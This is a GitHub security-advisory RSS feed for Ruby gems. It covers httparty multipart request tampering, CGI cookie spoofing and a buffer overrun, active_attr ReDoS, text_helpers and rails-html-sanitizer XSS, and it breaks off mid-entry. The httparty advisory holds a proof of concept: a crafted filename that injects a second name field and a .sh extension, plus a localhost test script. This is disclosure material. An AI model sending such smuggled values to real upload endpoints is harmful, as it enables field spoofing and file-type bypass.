<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2023-01-04T07:01:15.974Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[httparty] httparty has multipart/form-data request tampering vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5pq7-52mg-hr42</id>
        <link href="https://github.com/advisories/GHSA-5pq7-52mg-hr42"/>
        <updated>2023-01-03T13:36:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>I found "multipart/form-data request tampering vulnerability" caused by Content-Disposition "filename" lack of escaping in httparty.</p>
<p><code>httparty/lib/httparty/request</code> &gt; <code>body.rb</code> &gt; <code>def generate_multipart</code></p>
<p><a href="https://github.com/jnunemaker/httparty/blob/4416141d37fd71bdba4f37589ec265f55aa446ce/lib/httparty/request/body.rb#L43">https://github.com/jnunemaker/httparty/blob/4416141d37fd71bdba4f37589ec265f55aa446ce/lib/httparty/request/body.rb#L43</a></p>
<p>By exploiting this problem, the following attacks are possible</p>
<ul>
<li>An attack that rewrites the "name" field according to the crafted file name, impersonating (overwriting) another field.</li>
<li>Attacks that rewrite the filename extension at the time multipart/form-data is generated by tampering with the filename</li>
</ul>
<p>For example, this vulnerability can be exploited to generate the following Content-Disposition.</p>
<blockquote>
<p>Normal Request example:
normal input filename: <code>abc.txt</code></p>
<p>generated normal header in multipart/form-data
<code>Content-Disposition: form-data; name="avatar"; filename="abc.txt"</code></p>
</blockquote>
<blockquote>
<p>Malicious Request example
malicious input filename: <code>overwrite_name_field_and_extension.sh"; name="foo"; dummy=".txt</code></p>
<p>generated malicious header in multipart/form-data:
<code>Content-Disposition: form-data; name="avatar"; filename="overwrite_name_field_and_extension.sh"; name="foo"; dummy=".txt"</code></p>
</blockquote>
<p>The Abused Header has multiple name ( <code>avatar</code> &amp; <code>foo</code> ) fields and the "filename" has been rewritten from <code>*.txt</code> to <code>*.sh</code> .</p>
<p>These problems can result in successful or unsuccessful attacks, depending on the behavior of the parser receiving the request.
I have confirmed that the attack succeeds, at least in the following frameworks</p>
<ul>
<li>Spring (Java)</li>
<li>Ktor (Kotlin)</li>
<li>Ruby on Rails (Ruby)</li>
</ul>
<p>The cause of this problem is the lack of escaping of the <code>"</code> (Double-Quote) character in Content-Disposition &gt; filename.</p>
<p>WhatWG's HTML spec has an escaping requirement.</p>
<p><a href="https://html.spec.whatwg.org/#multipart-form-data">https://html.spec.whatwg.org/#multipart-form-data</a></p>
<blockquote>
<p>For field names and filenames for file fields, the result of the encoding in the previous bullet point must be escaped by replacing any 0x0A (LF) bytes with the byte sequence <code>%0A</code>, 0x0D (CR) with <code>%0D</code> and 0x22 (") with <code>%22</code>. The user agent must not perform any other escapes.</p>
</blockquote>
<h3 id="patches">Patches</h3>
<p>As noted at the beginning of this section, encoding must be done as described in the HTML Spec.</p>
<p><a href="https://html.spec.whatwg.org/#multipart-form-data">https://html.spec.whatwg.org/#multipart-form-data</a></p>
<blockquote>
<p>For field names and filenames for file fields, the result of the encoding in the previous bullet point must be escaped by replacing any 0x0A (LF) bytes with the byte sequence <code>%0A</code>, 0x0D (CR) with <code>%0D</code> and 0x22 (") with <code>%22</code>. The user agent must not perform any other escapes.</p>
</blockquote>
<p>Therefore, it is recommended that Content-Disposition be modified by either of the following</p>
<blockquote>
<p>Before:
<code>Content-Disposition: attachment;filename="malicious.sh";dummy=.txt</code></p>
</blockquote>
<blockquote>
<p>After:
<code>Content-Disposition: attachment;filename="%22malicious.sh%22;dummy=.txt"</code></p>
</blockquote>
<p><a href="https://github.com/jnunemaker/httparty/blob/4416141d37fd71bdba4f37589ec265f55aa446ce/lib/httparty/request/body.rb#L43">https://github.com/jnunemaker/httparty/blob/4416141d37fd71bdba4f37589ec265f55aa446ce/lib/httparty/request/body.rb#L43</a></p>
<pre><code>file_name.gsub('"', '%22')
</code></pre>
<p>Also, as for <code>\r</code>, <code>\n</code>, URL Encode is not done, but it is not newlines, so it seemed to be OK.
However, since there may be omissions, it is safer to URL encode these as well, if possible.
( <code>\r</code> to <code>%0A</code> and <code>\d</code> to <code>%0D</code> ) </p>
<h3 id="poc">PoC</h3>
<h4 id="poc-environment">PoC Environment</h4>
<p>OS: macOS Monterey(12.3)
Ruby ver: ruby 3.1.2p20 
httparty ver: 0.20.0
(Python3 - HTTP Request Logging Server)</p>
<h3 id="poc-procedure">PoC procedure</h3>
<p>(Linux or MacOS is required. 
This is because Windows does not allow file names containing <code>"</code> (double-quote) .)</p>
<ol>
<li>Create Project</li>
</ol>
<pre><code>$ mkdir my-app
$ cd my-app
$ gem install httparty
</code></pre>
<ol start="2">
<li>Create malicious file</li>
</ol>
<pre><code>$ touch 'overwrite_name_field_and_extension.sh"; name="foo"; dummy=".txt'
</code></pre>
<ol start="3">
<li>Generate Vuln code</li>
</ol>
<pre><code>$ vi example.rb
</code></pre>
<pre><code>require 'httparty'

filename = 'overwrite_name_field_and_extension.sh"; name="foo"; dummy=".txt'

HTTParty.post('http://localhost:12345/',
  body: {
    name: 'Foo Bar',
    email: 'example@email.com',
    avatar: File.open(filename)
  }
)
</code></pre>
<ol start="4">
<li>Run Logging Server</li>
</ol>
<p>I write Python code, but any method will work as long as you can see the HTTP Request Body.
(e.g. Debugger, HTTP Logging Server, Packet Capture) </p>
<p>$ vi logging.py</p>
<pre><code>from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler

class LoggingServer(BaseHTTPRequestHandler):

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write("ok".encode("utf-8"))

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                     str(self.path), str(self.headers), post_data.decode('utf-8'))
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

ip = '127.0.0.1'
port = 12345

server = HTTPServer((ip, port), LoggingServer)
server.serve_forever()
</code></pre>
<p>$ python logging.py</p>
<ol start="5">
<li>Run &amp; Logging server</li>
</ol>
<pre><code>$ run example.rb
</code></pre>
<p>Return Request Header &amp; Body:</p>
<blockquote>
<p>User-Agent: Ruby
Content-Type: multipart/form-data; boundary=------------------------F857UcxRc2J1zFOz
Connection: close
Host: localhost:12345
Content-Length: 457</p>
<p> --------------------------F857UcxRc2J1zFOz
Content-Disposition: form-data; name="name"</p>
<p>Foo Bar
--------------------------F857UcxRc2J1zFOz
Content-Disposition: form-data; name="email"</p>
<p><a href="mailto:example@email.com">example@email.com</a>
--------------------------F857UcxRc2J1zFOz
Content-Disposition: form-data; name="avatar"; filename="overwrite_name_field_and_extension.sh"; name="foo"; dummy=".txt"
Content-Type: text/plain</p>
<p>abc
--------------------------F857UcxRc2J1zFOz--</p>
</blockquote>
<p>Content-Disposition:</p>
<blockquote>
<p>Content-Disposition: form-data; name="avatar"; filename="overwrite_name_field_and_extension.sh"; name="foo"; dummy=".txt"</p>
</blockquote>
<ul>
<li>name fields is duplicate (avator &amp; foo)</li>
<li>filename &amp; extension tampering ( .txt --&gt; .sh )</li>
</ul>
<h3 id="references">References</h3>
<ol>
<li><p>I also include a similar report that I previously reported to Firefox.
<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1556711">https://bugzilla.mozilla.org/show_bug.cgi?id=1556711</a></p>
</li>
<li><p>I will post some examples of frameworks that did not have problems as reference.</p>
</li>
</ol>
<p>Golang
<a href="https://github.com/golang/go/blob/e0e0c8fe9881bbbfe689ad94ca5dddbb252e4233/src/mime/multipart/writer.go#L144">https://github.com/golang/go/blob/e0e0c8fe9881bbbfe689ad94ca5dddbb252e4233/src/mime/multipart/writer.go#L144</a></p>
<p>Spring
<a href="https://github.com/spring-projects/spring-framework/blob/4cc91e46b210b4e4e7ed182f93994511391b54ed/spring-web/src/main/java/org/springframework/http/ContentDisposition.java#L259-L267">https://github.com/spring-projects/spring-framework/blob/4cc91e46b210b4e4e7ed182f93994511391b54ed/spring-web/src/main/java/org/springframework/http/ContentDisposition.java#L259-L267</a></p>
<p>Symphony
<a href="https://github.com/symfony/symfony/blob/123b1651c4a7e219ba59074441badfac65525efe/src/Symfony/Component/Mime/Header/ParameterizedHeader.php#L128-L133">https://github.com/symfony/symfony/blob/123b1651c4a7e219ba59074441badfac65525efe/src/Symfony/Component/Mime/Header/ParameterizedHeader.php#L128-L133</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:kumagoro_alice@yahoo.co.jp">kumagoro_alice@yahoo.co.jp</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jnunemaker/httparty/security/advisories/GHSA-5pq7-52mg-hr42">https://github.com/jnunemaker/httparty/security/advisories/GHSA-5pq7-52mg-hr42</a></li>
<li><a href="https://github.com/jnunemaker/httparty/commit/cdb45a678c43e44570b4e73f84b1abeb5ec22b8e">https://github.com/jnunemaker/httparty/commit/cdb45a678c43e44570b4e73f84b1abeb5ec22b8e</a></li>
<li><a href="https://github.com/jnunemaker/httparty/blob/4416141d37fd71bdba4f37589ec265f55aa446ce/lib/httparty/request/body.rb#L43">https://github.com/jnunemaker/httparty/blob/4416141d37fd71bdba4f37589ec265f55aa446ce/lib/httparty/request/body.rb#L43</a></li>
<li><a href="https://github.com/advisories/GHSA-5pq7-52mg-hr42">https://github.com/advisories/GHSA-5pq7-52mg-hr42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5pq7-52mg-hr42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-01-03T13:36:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] Cookie prefix spoofing in CGI]]></title>
        <id>https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</id>
        <link href="https://github.com/advisories/GHSA-4vf4-qmvg-mh7h"/>
        <updated>2022-12-29T15:13:18.000Z</updated>
        <content type="html"><![CDATA[<p>CGI::Cookie.parse in Ruby through 2.6.8 mishandles security prefixes in cookie names. This also affects the CGI gem prior to versions 0.3.1, 0.2.1, 0.1.1, and 0.1.0.1 for Ruby.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41819">https://nvd.nist.gov/vuln/detail/CVE-2021-41819</a></li>
<li><a href="https://hackerone.com/reports/910552">https://hackerone.com/reports/910552</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/">https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220121-0003/">https://security.netapp.com/advisory/ntap-20220121-0003/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41819.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41819.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-4vf4-qmvg-mh7h">https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-01-21T23:22:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] Cookie prefix spoofing in CGI]]></title>
        <id>https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</id>
        <link href="https://github.com/advisories/GHSA-4vf4-qmvg-mh7h"/>
        <updated>2022-12-29T15:13:18.000Z</updated>
        <content type="html"><![CDATA[<p>CGI::Cookie.parse in Ruby through 2.6.8 mishandles security prefixes in cookie names. This also affects the CGI gem prior to versions 0.3.1, 0.2.1, 0.1.1, and 0.1.0.1 for Ruby.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41819">https://nvd.nist.gov/vuln/detail/CVE-2021-41819</a></li>
<li><a href="https://hackerone.com/reports/910552">https://hackerone.com/reports/910552</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/">https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220121-0003/">https://security.netapp.com/advisory/ntap-20220121-0003/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41819.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41819.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-4vf4-qmvg-mh7h">https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-01-21T23:22:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] Cookie prefix spoofing in CGI]]></title>
        <id>https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</id>
        <link href="https://github.com/advisories/GHSA-4vf4-qmvg-mh7h"/>
        <updated>2022-12-29T15:13:18.000Z</updated>
        <content type="html"><![CDATA[<p>CGI::Cookie.parse in Ruby through 2.6.8 mishandles security prefixes in cookie names. This also affects the CGI gem prior to versions 0.3.1, 0.2.1, 0.1.1, and 0.1.0.1 for Ruby.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41819">https://nvd.nist.gov/vuln/detail/CVE-2021-41819</a></li>
<li><a href="https://hackerone.com/reports/910552">https://hackerone.com/reports/910552</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/">https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220121-0003/">https://security.netapp.com/advisory/ntap-20220121-0003/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41819.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41819.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-4vf4-qmvg-mh7h">https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vf4-qmvg-mh7h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-01-21T23:22:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] Buffer overrun in CGI.escape_html]]></title>
        <id>https://github.com/advisories/GHSA-5cqm-crxm-6qpv</id>
        <link href="https://github.com/advisories/GHSA-5cqm-crxm-6qpv"/>
        <updated>2022-12-28T18:39:50.000Z</updated>
        <content type="html"><![CDATA[<p>A buffer overrun vulnerability was discovered in CGI.escape_html. This can lead to a buffer overflow when a user passes a very large string (&gt; 700 MB) to CGI.escape_html on a platform where long type takes 4 bytes, typically, Windows.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41816">https://nvd.nist.gov/vuln/detail/CVE-2021-41816</a></li>
<li><a href="https://groups.google.com/g/ruby-security-ann/c/4MQ568ZG47c">https://groups.google.com/g/ruby-security-ann/c/4MQ568ZG47c</a></li>
<li><a href="https://hackerone.com/reports/1328463">https://hackerone.com/reports/1328463</a></li>
<li><a href="https://security-tracker.debian.org/tracker/CVE-2021-41816">https://security-tracker.debian.org/tracker/CVE-2021-41816</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2021/11/24/buffer-overrun-in-cgi-escape_html-cve-2021-41816/">https://www.ruby-lang.org/en/news/2021/11/24/buffer-overrun-in-cgi-escape_html-cve-2021-41816/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220303-0006/">https://security.netapp.com/advisory/ntap-20220303-0006/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IUXQCH6FRKANCVZO2Q7D2SQX33FP3KWN/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UTOJGS5IEFDK3UOO7IY4OTTFGHGLSWZF/</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41816.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-41816.yml</a></li>
<li><a href="https://github.com/ruby/cgi/commit/959ccf0b6a672bcc64aeaa60c6e1f9e728f1e87f">https://github.com/ruby/cgi/commit/959ccf0b6a672bcc64aeaa60c6e1f9e728f1e87f</a></li>
<li><a href="https://github.com/ruby/cgi/commit/ad079c1cb5f58eba1ffac46da79995fcf94a3a6e">https://github.com/ruby/cgi/commit/ad079c1cb5f58eba1ffac46da79995fcf94a3a6e</a></li>
<li><a href="https://github.com/ruby/cgi/commit/c6a37a671b556eb06140ea89cc465136b24207a6">https://github.com/ruby/cgi/commit/c6a37a671b556eb06140ea89cc465136b24207a6</a></li>
<li><a href="https://github.com/ruby/cgi/commit/c728632c1c09d46cfd4ecbff9caaa3651dd1002a">https://github.com/ruby/cgi/commit/c728632c1c09d46cfd4ecbff9caaa3651dd1002a</a></li>
<li><a href="https://github.com/advisories/GHSA-5cqm-crxm-6qpv">https://github.com/advisories/GHSA-5cqm-crxm-6qpv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5cqm-crxm-6qpv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-12-14T21:36:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[active_attr] active_attr Improper Resource Shutdown or Release vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4whf-rmx5-8frv</id>
        <link href="https://github.com/advisories/GHSA-4whf-rmx5-8frv"/>
        <updated>2023-01-03T21:25:18.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability classified as problematic has been found in cgriego active_attr up to 0.15.3. This affects the function call of the file lib/active_attr/typecasting/boolean_typecaster.rb of the component Regex Handler. The manipulation of the argument value leads to denial of service. The exploit has been disclosed to the public and may be used. Upgrading to version 0.15.4 can address this issue. The name of the patch is dab95e5843b01525444b82bd7b336ef1d79377df. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216207.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4250">https://nvd.nist.gov/vuln/detail/CVE-2021-4250</a></li>
<li><a href="https://github.com/cgriego/active_attr/issues/184">https://github.com/cgriego/active_attr/issues/184</a></li>
<li><a href="https://github.com/cgriego/active_attr/pull/185">https://github.com/cgriego/active_attr/pull/185</a></li>
<li><a href="https://github.com/cgriego/active_attr/commit/dab95e5843b01525444b82bd7b336ef1d79377df">https://github.com/cgriego/active_attr/commit/dab95e5843b01525444b82bd7b336ef1d79377df</a></li>
<li><a href="https://github.com/cgriego/active_attr/releases/tag/v0.15.4">https://github.com/cgriego/active_attr/releases/tag/v0.15.4</a></li>
<li><a href="https://vuldb.com/?id.216207">https://vuldb.com/?id.216207</a></li>
<li><a href="https://github.com/cgriego/active_attr/releases/tag/v0.15.3">https://github.com/cgriego/active_attr/releases/tag/v0.15.3</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/active_attr/CVE-2021-4250.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/active_attr/CVE-2021-4250.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-4whf-rmx5-8frv">https://github.com/advisories/GHSA-4whf-rmx5-8frv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4whf-rmx5-8frv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-19T00:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[text_helpers] text_helpers uses web link to untrusted target with window.opener access]]></title>
        <id>https://github.com/advisories/GHSA-74hc-57m5-83ch</id>
        <link href="https://github.com/advisories/GHSA-74hc-57m5-83ch"/>
        <updated>2022-12-29T19:23:01.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in ahorner text-helpers 1.1.0/1.1.1. This vulnerability affects unknown code of the file lib/text_helpers/translation.rb. The manipulation of the argument link leads to use of web link to untrusted target with window.opener access. The attack can be initiated remotely. Upgrading to version 1.2.0 can address this issue. The name of the patch is 184b60ded0e43c985788582aca2d1e746f9405a3. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-216520.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-36624">https://nvd.nist.gov/vuln/detail/CVE-2020-36624</a></li>
<li><a href="https://github.com/ahorner/text-helpers/pull/19">https://github.com/ahorner/text-helpers/pull/19</a></li>
<li><a href="https://github.com/ahorner/text-helpers/commit/184b60ded0e43c985788582aca2d1e746f9405a3">https://github.com/ahorner/text-helpers/commit/184b60ded0e43c985788582aca2d1e746f9405a3</a></li>
<li><a href="https://github.com/ahorner/text-helpers/releases/tag/v1.2.0">https://github.com/ahorner/text-helpers/releases/tag/v1.2.0</a></li>
<li><a href="https://vuldb.com/?id.216520">https://vuldb.com/?id.216520</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/text_helpers/CVE-2020-36624.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/text_helpers/CVE-2020-36624.yml</a></li>
<li><a href="https://github.com/ahorner/text-helpers/releases/tag/v1.1.0">https://github.com/ahorner/text-helpers/releases/tag/v1.1.0</a></li>
<li><a href="https://github.com/advisories/GHSA-74hc-57m5-83ch">https://github.com/advisories/GHSA-74hc-57m5-83ch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74hc-57m5-83ch</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-22T12:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rails-html-sanitizer] Possible XSS vulnerability with certain configurations of rails-html-sanitizer]]></title>
        <id>https://github.com/advisories/GHSA-rrfc-7g8p-99q8</id>
        <link href="https://github.com/advisories/GHSA-rrfc-7g8p-99q8"/>
        <updated>2022-12-17T00:32:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>There is a possible XSS vulnerability with certain configurations of Rails::Html::Sanitizer. This is due to an incomplete fix of CVE-2022-32209.</p>
<ul>
<li>Versions affected: ALL</li>
<li>Not affected: NONE</li>
<li>Fixed versions: 1.4.4</li>
</ul>
<h2 id="impact">Impact</h2>
<p>A possible XSS vulnerability with certain configurations of Rails::Html::Sanitizer may allow an attacker to inject content if the application developer has overridden the sanitizer's allowed tags to allow both "select" and "style" elements.</p>
<p>Code is only impacted if allowed tags are being overridden using either of the following two mechanisms:</p>
<ol>
<li>Using the Rails configuration <code>config.action_view.sanitized_allow_tags=</code>:</li>
</ol>
<pre><code class="language-ruby"># In config/application.rb
config.action_view.sanitized_allowed_tags = ["select", "style"]
</code></pre>
<p>  (see <a href="https://guides.rubyonrails.org/configuring.html#configuring-action-view">https://guides.rubyonrails.org/configuring.html#configuring-action-view</a>)</p>
<ol start="2">
<li>Using the class method <code>Rails::Html::SafeListSanitizer.allowed_tags=</code>:</li>
</ol>
<pre><code class="language-ruby"># class-level option
Rails::Html::SafeListSanitizer.allowed_tags = ["select", "style"]
</code></pre>
<p>All users overriding the allowed tags by either of the above mechanisms to include both "select" and "style" should either upgrade or use one of the workarounds immediately.</p>
<p>NOTE: Code is <em>not</em> impacted if allowed tags are overridden using either of the following mechanisms:</p>
<ul>
<li>the <code>:tags</code> option to the Action View helper method <code>sanitize</code>.</li>
<li>the <code>:tags</code> option to the instance method <code>SafeListSanitizer#sanitize</code>.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Remove either "select" or "style" from the overridden allowed tags.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)</a></li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32209">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32209</a></li>
<li><a href="https://hackerone.com/reports/1654310">https://hackerone.com/reports/1654310</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was responsibly reported by Dominic Breuker.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-rrfc-7g8p-99q8">https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-rrfc-7g8p-99q8</a></li>
<li><a href="https://hackerone.com/reports/1654310">https://hackerone.com/reports/1654310</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23520.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23520.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23520">https://nvd.nist.gov/vuln/detail/CVE-2022-23520</a></li>
<li><a href="https://github.com/advisories/GHSA-rrfc-7g8p-99q8">https://github.com/advisories/GHSA-rrfc-7g8p-99q8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rrfc-7g8p-99q8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-13T17:51:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rails-html-sanitizer] Possible XSS vulnerability with certain configurations of rails-html-sanitizer]]></title>
        <id>https://github.com/advisories/GHSA-9h9g-93gc-623h</id>
        <link href="https://github.com/advisories/GHSA-9h9g-93gc-623h"/>
        <updated>2022-12-17T00:32:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>There is a possible XSS vulnerability with certain configurations of Rails::Html::Sanitizer.</p>
<ul>
<li>Versions affected: ALL</li>
<li>Not affected: NONE</li>
<li>Fixed versions: 1.4.4</li>
</ul>
<h2 id="impact">Impact</h2>
<p>A possible XSS vulnerability with certain configurations of Rails::Html::Sanitizer may allow an attacker to inject content if the application developer has overridden the sanitizer's allowed tags in either of the following ways:</p>
<ul>
